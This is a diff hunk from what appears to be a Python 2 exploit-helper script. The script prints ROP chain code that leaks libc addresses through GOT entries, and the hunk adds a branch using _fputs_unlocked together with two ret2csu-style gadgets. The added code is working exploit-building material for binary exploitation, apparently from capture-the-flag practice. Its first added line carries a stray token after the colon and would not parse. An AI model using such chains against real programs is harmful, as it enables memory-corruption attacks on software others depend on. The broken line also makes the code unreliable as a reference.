@@ -151,6 +151,29 @@ elif "stdout" in binary.symbols:
         print "rop += p64(0) # r13"
         print "rop += p64(0) # r14"
         print "rop += p64(0) # r15"
+    elif "_fputs_unlocked" in binary.got:_fputs_unlocked
+        print "[*] using `_fputs_unlocked` to print the leak"
+        print
+        # fputs(stdout, &fputs)
+        print "rop = ''"
+        print "rop += p64(0x%x) # gadget 1" % gadget1
+        print "rop += p64(0) # rbx"
+        print "rop += p64(0) # rbp"
+        print "rop += p64(0x%x) # r12 [_fputs_unlocked@got]" % binary.got["_fputs_unlocked"]
+        print "rop += p64(0) # r13"
+        print "rop += p64(0x%x) # r14 [stdout]" % binary.symbols["stdout"]
+        if to_leak == None:
+            print "rop += p64(0x%x) # r15 [_fputs_unlocked@got]" % binary.got["_fputs_unlocked"]
+        else:
+            print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
+        print "rop += p64(0x%x) # gadget 2" % gadget2
+        print "rop += p64(0xdeadbeef) # junk"
+        print "rop += p64(0) # rbx"
+        print "rop += p64(0) # rbp"
+        print "rop += p64(0) # r12"
+        print "rop += p64(0) # r13"
+        print "rop += p64(0) # r14"
+        print "rop += p64(0) # r15"
     elif "fprintf" in binary.got:
         print "[*] using `fprintf` to print the leak"
         print
